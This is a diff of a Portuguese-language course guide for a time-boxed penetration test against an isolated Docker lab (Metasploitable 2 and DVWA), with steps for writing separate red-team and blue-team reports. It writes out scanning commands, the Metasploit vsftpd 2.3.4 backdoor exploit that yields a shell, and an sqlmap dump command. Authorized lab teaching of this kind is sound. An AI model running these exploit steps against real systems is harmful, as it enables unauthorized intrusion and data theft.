@@ -97,28 +97,35 @@ Express significa **caixa de tempo**: você não vai testar tudo, vai testar o q
 
 ## 🧰 Passo 0 — Antes de tocar no alvo
 
-Três coisas, sempre nesta ordem.
+**1. Confirme o escopo.** Seu único alvo autorizado é o **laboratório da disciplina**. Tudo fora dele = não toque.
 
-**1. Confirme o escopo (o que pode atacar).** Aqui: só o laboratório. Anote o IP/URL do alvo. Tudo fora disso = fora do escopo = não toque.
+**2. Suba o laboratório (já vem pronto).** O ambiente traz a **máquina atacante (Kali com as ferramentas)** e os **alvos** já configurados, em rede isolada. Você não instala nada além do Docker — sem perder tempo montando ambiente.
 
-**2. Crie a pasta de evidências.** Sem evidência não há relatório. Crie a estrutura **antes** de começar e jogue a saída de todo comando lá dentro.
+> [!tip] ⬇️ Laboratório pronto (Docker)
+> Baixe e descompacte o **[[Recursos/Segurança da informação/Teste de Intrusão Express/pentest-express-lab.zip|pentest-express-lab.zip]]**. Dentro da pasta `pentest-express/`:
+> ```bash
+> docker compose up -d --build       # 1ª vez baixa/constrói (alguns min); depois é instantâneo
+> docker compose ps                  # confere que está tudo no ar
+> docker compose exec atacante bash  # entra na máquina atacante (Kali, em /work)
+> ```
+> Os alvos são alcançados **pelo nome** (o Docker resolve o IP). Ao terminar a sessão: `docker compose down`.
+>
+> | Nome | O que é | Como começar |
+> |------|---------|--------------|
+> | `alvo` | Metasploitable 2 (SO/serviços) | `nmap alvo` |
+> | `alvo-web` | DVWA (web) | `curl http://alvo-web` |
+>
+> O zip traz `docker-compose.yml` + `atacante/Dockerfile` + `README`. Tudo que você salvar em `/work` aparece na pasta `work/` no host e **sobrevive ao `docker compose down`** — é onde mora sua entrega.
+
+**3. Crie a pasta de evidências.** Sem evidência não há relatório. Dentro da máquina atacante:
 
 ```bash
-mkdir -p ~/pentest-express/{recon,exploração,evidências}
-cd ~/pentest-express
-# Grave TUDO num log com data/hora — seu relatório nasce daqui:
-script -a evidências/sessao.log    # 'exit' encerra a gravação
-```
-
-**3. Suba o alvo do laboratório** (exemplo com o lab em Docker entregue na disciplina):
-
-```bash
-docker compose up -d          # sobe o(s) alvo(s) do lab
-docker compose ps             # confirma o que está no ar e em qual porta
+mkdir -p /work/{recon,exploração,evidências} && cd /work
+script -a evidências/sessao.log    # grava sua sessão com data/hora; 'exit' encerra
 ```
 
 > [!example] 🧪 Atividade — preparar o terreno
-> Suba o laboratório, rode `docker compose ps` e **anote o IP/porta do alvo** no topo do seu `sessao.log`. Resultado observável: o container do alvo aparece como `running` e você consegue um `ping`/`curl` de resposta. (Setup detalhado: [[Preparando o terreno]] e [[Sistemas utilizados]].)
+> Suba o lab, entre no atacante (`docker compose exec atacante bash`) e rode `nmap alvo`. **Resultado observável:** o `nmap` lista as portas abertas do alvo (ftp, ssh, http, samba…). Listou? Ambiente pronto. (Montar um lab do zero, a fundo: [[Preparando o terreno]] e [[Sistemas utilizados]].)
 
 ---
 
@@ -127,17 +134,15 @@ docker compose ps             # confirma o que está no ar e em qual porta
 Objetivo: descobrir **quais portas estão abertas, quais serviços e quais versões**. É daqui que saem os alvos de exploração.
 
 ```bash
-ALVO=192.168.x.x   # IP do seu lab
+# Varredura completa do alvo: portas, versões, scripts padrão, SO
+nmap -sC -sV -O -p- --open alvo -oA recon/nmap_full
 
-# Varredura completa: portas, versões, scripts padrão, SO
-nmap -sC -sV -O -p- --open $ALVO -oA recon/nmap_full
-
-# Se for alvo web, enumere também o conteúdo:
-nikto -h http://$ALVO -o recon/nikto.txt
-gobuster dir -u http://$ALVO -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o recon/gobuster.txt
+# No alvo web (DVWA), enumere também o conteúdo:
+nikto -h http://alvo-web -o recon/nikto.txt
+gobuster dir -u http://alvo-web -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -o recon/gobuster.txt
 ```
 
-**Resultado observável:** uma lista de portas com serviço e versão (ex.: `21/tcp vsftpd 2.3.4`, `80/tcp Apache 2.2.8`, `445/tcp Samba 3.x`). Cada versão antiga é um candidato a vulnerabilidade.
+**Resultado observável:** uma lista de portas com serviço e versão (no lab: `21/tcp vsftpd 2.3.4`, `80/tcp Apache 2.2.8`, `139/445 Samba`, `3306 MySQL`, `8180 Tomcat`…). Cada versão antiga é um candidato a vulnerabilidade.
 
 > [!tip] Aprofundar quando sobrar tempo
 > Reconhecimento passivo (OSINT, Shodan, Google dorks) e ativo em detalhe: [[Coleta de informações]]. Port scanning avançado: [[Escaneamento de IPs e portas (Port Scanning)]].
@@ -156,7 +161,7 @@ searchsploit samba 3.
 # Exploração guiada via Metasploit (exemplo: backdoor do vsftpd 2.3.4)
 msfconsole -q
 use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 192.168.x.x
+set RHOSTS alvo
 run
 # ➜ shell obtida; confirme quem você é:
 id
@@ -165,7 +170,7 @@ id
 **Para alvo web** (DVWA / Juice Shop), os vetores mais rápidos são SQL Injection, upload de webshell e credencial padrão. Comece pelo `sqlmap`:
 
 ```bash
-sqlmap -u "http://$ALVO/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --batch --dump
+sqlmap -u "http://alvo-web/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<seu_cookie>; security=low" --batch --dump
 ```
 
 > [!warning] 📸 Tire o print AGORA
@@ -223,6 +228,9 @@ Evidência (PoC): <comando + saída + nome do print>
 Impacto: <o que um atacante REAL conseguiria com isso>
 ```
 
+> [!tip] 📝 Não comece do zero
+> Baixe o **[[Recursos/Segurança da informação/Teste de Intrusão Express/Relatorio do Ataque (Red) - MODELO.docx|modelo do Relatório do Ataque (.docx)]]** e preencha. Estrutura completa, exemplo de _finding_ e teoria do CVSS: [[Documentação Report]].
+
 > [!tip] CVSS em 1 minuto
 > A nota define a urgência. Use a [calculadora oficial CVSS 4.0](https://www.first.org/cvss/calculator/4.0), cole o vetor gerado no achado e classifique: **Crítico 9.0-10.0 · Alto 7.0-8.9 · Médio 4.0-6.9 · Baixo 0.1-3.9**. Teoria completa do CVSS em [[Documentação Report]].
 
@@ -231,6 +239,9 @@ Impacto: <o que um atacante REAL conseguiria com isso>
 ## 🛡️ Passo 5 — Relatório 2: para o Blue Team
 
 Aqui está o diferencial da disciplina, e a parte que a maioria esquece. O Blue Team **não quer saber como você invadiu** — quer saber **o que fazer na segunda-feira de manhã**. Reescreva cada achado do Passo 4 nesta lente de **correção**:
+
+> [!tip] 📝 Modelo pronto
+> Baixe o **[[Recursos/Segurança da informação/Teste de Intrusão Express/Relatorio para o Blue Team - MODELO.docx|modelo do Relatório para o Blue Team (.docx)]]** e preencha um bloco por achado.
 
 Para **cada achado**, entregue os quatro campos:
 
